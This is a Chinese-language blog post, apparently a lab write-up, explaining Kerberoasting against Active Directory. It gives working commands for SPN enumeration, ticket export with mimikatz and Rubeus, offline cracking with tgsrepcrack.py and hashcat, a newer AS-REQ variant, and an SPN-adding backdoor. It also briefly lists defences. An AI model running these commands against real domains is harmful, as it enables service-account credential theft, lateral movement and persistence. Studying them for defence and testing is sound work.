---
title: Kerberoasting 攻击
published: 2025-03-09 16:46:27
tags: [内网安全,域渗透]
category: 安全
draft: false
---

# Kerberoasting 攻击

> https://xz.aliyun.com/t/13697?time__1311=GqmxuD9DgiYeqGNDQi5BKuxiq4xf20kYRrD
> 

`Kerberoasting` 是一种允许攻击者窃取使用 `RC4` 加密的 `KRB_TGS` 票证的技术，以暴力破解应用程序服务 `HASH` 来获取其密码（重要是`RC4` 加密的）

`Kerberos` 使用所请求服务的 `NTLM` 哈希来加密给定服务主体名称 (SPN) 的 `KRB_TGS` 票证。当域用户向域控制器 `KDC` 发送针对已注册 `SPN` 的任何服务的 `TGS 票证`请求时，`KDC` 会生成 `KRB_TGS`

攻击者可以离线使用例如`hashcat`来暴力破解服务帐户的密码，因为该票证已使用服务帐户的 `NTLM 哈希`进行了加密。

**Kerberoasting攻击主要步骤如下**

> 1.发现SPN服务
> 
> 
> 2.使用工具向 SPN 请求 TGS 票据
> 
> 3.转储 .kirbi 或 ccache 或服务 HASH 的 TGS 票据
> 
> 4.将 .kirbi 或 ccache 文件转换为可破解格式
> 
> 5.使用hashcat等工具配合字典进行暴力破解
> 

**Kerberoasting**分为旧**Kerberoasting**攻击和新**Kerberoasting**攻击，多个步骤的攻击叫做旧 `kerberoasting` 攻击，单个步骤的攻击叫做新 `kerberoasting` 攻击

## kerberoasting 攻击的目的

**Kerberoasting** 的核心目的是**获取服务账户的密码或 NTLM 哈希**。通过这个密码，攻击者可以进一步提升权限，进行横向移动，甚至完全控制整个域

## 我们平常该找哪些SPN

- Web 服务 (`HTTP`)：用于攻击基于 IIS 的应用。
- SQL Server (`MSSQLSvc`)：允许攻击者访问数据库。
- 文件共享 (`CIFS`)：用于访问网络共享资源。

## 攻击前提

Kerberoasting攻击的主要前提是口令复杂度较低、 加密算法强度较弱

对抗Kerberoasting攻击也需从这2方面开展:

- 提高服务账号的口令复杂度；
- 尽量将域内的服务器系统升级至少至Windows 2008 系统，应用AES256高难度的加密算法.

## 基于mimikatz

1. 发现SPN
    
    使用`windows`下自带的`setspn.exe` ，找到有价值的SPN
    
    - 该SPN注册在域用户帐户(Users)下
    - 域用户账户的权限很高
    
    ```python
    PS C:\Users\a\Desktop\RiskySPN> setspn -T god.org -q */*
    正在检查域 DC=god,DC=org
    CN=OWA,OU=Domain Controllers,DC=god,DC=org
            ldap/owa.god.org/ForestDnsZones.god.org
            ldap/owa.god.org/DomainDnsZones.god.org
            NtFrs-88f5d2bd-b646-11d2-a6d3-00c04fc9b232/owa.god.org
            Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/owa.god.org
            DNS/owa.god.org
            GC/owa.god.org/god.org
            RestrictedKrbHost/owa.god.org
            RestrictedKrbHost/OWA
            HOST/OWA/GOD
            HOST/owa.god.org/GOD
            HOST/OWA
            HOST/owa.god.org
            HOST/owa.god.org/god.org
            E3514235-4B06-11D1-AB04-00C04FC2DCD2/fef2b3c9-4cec-410a-9d24-baba7891c01
    4/god.org
            ldap/OWA/GOD
            ldap/fef2b3c9-4cec-410a-9d24-baba7891c014._msdcs.god.org
            ldap/owa.god.org/GOD
            ldap/OWA
            ldap/owa.god.org
            ldap/owa.god.org/god.org
    CN=krbtgt,CN=Users,DC=god,DC=org
            kadmin/changepw
    CN=ROOT-TVI862UBEH,CN=Computers,DC=god,DC=org
            HOST/ROOT-TVI862UBEH
            HOST/root-tvi862ubeh.god.org
    CN=stu1,OU=dev,DC=god,DC=org
            TERMSRV/STU1
            TERMSRV/stu1.god.org
            RestrictedKrbHost/STU1
            HOST/STU1
            RestrictedKrbHost/STU1.god.org
            HOST/STU1.god.org
    CN=a,CN=Users,DC=god,DC=org
            web/stu1.god.org:80
    ```
    
    目标是：`web/stu1.god.org:80` ，注册在域用户`a`下,还不确定权限，但是可以先尝试
    
2. 使用mimikatz请求SPN服务并且导出ST票据
    
    ```python
    mimikatz.exe "kerberos::ask /target:web/stu1.god.org:80" "kerberos::list /export" exit
    ```
    
    ![image.png](image%2017.png)
    
    ![image.png](image%2018.png)
    
3. 对票据进行暴力破解（该脚本由https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py）
    
    ```python
    python tgsrepcrack.py pass.txt tgs.kirbi
    ```
    
    `pass.txt` 是密码字典，`tgs.kirbi`导出来的票据
    
    ```python
    python tgsrepcrack.py ../pass.txt ../2-40a00000-a@web\~stu1.god.org\~80-GOD.ORG.kirbi                                     
    
        USE HASHCAT, IT'S HELLA FASTER!!
    
    Cracking 1 tickets...
    found password for ticket 0:  File: ../2-40a00000-a@web~stu1.god.org~80-GOD.ORG.kirbi
    Successfully cracked all tickets
    ```
    
    破解成功，密码是`Aa20040422` ，需要字典强大
    

## 基于**Rubeus**

就是用 **Rubeus.exe,** 构建麻烦并且是用什么`Framework`版本构建的就要在什么环境使用

1. 发现`SPN`，提取`TGS`，转储为`HASH`到`hash.txt`
    
    ```python
    Rubeus.exe kerberoast /outfile:hash.txt
    ```
    
    ![image.png](image%2019.png)
    
2. 放到`hashcat`破解
    
    ```python
    hashcat -m 13100 -a 0  hash.txt pass.txt
    ```
    
    ![image.png](image%2020.png)
    
    主要还是看字典的强度
    

## 新型 Kerberoasting

https://www.semperis.com/blog/new-attack-paths-as-requested-sts/

> 我修改 Rubeus 以确定在AS-REQ 的**sname**中指定另一个 SPN 是否会导致 DC 为该 SPN 回复 ST。事实证明，答案是“是”（默认在初始请求的`sname`字段是`krbtgt`）
> 

并且在未开启预身份验证（`DONT_REQ_PREAUTH`）的用户尤其有效

例如使用`GetNPUsers.py` 找到不需要预身份验证的用户，然后在`AS_REQ`请求时的`sname`字段设置为服务的`SPN`即可获得`ST` (`jjones`用户当前不需要预身份验证)

![image.png](image%2021.png)

在`Rebeus`中也可以使用

## 后门利用

在我们取得了SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令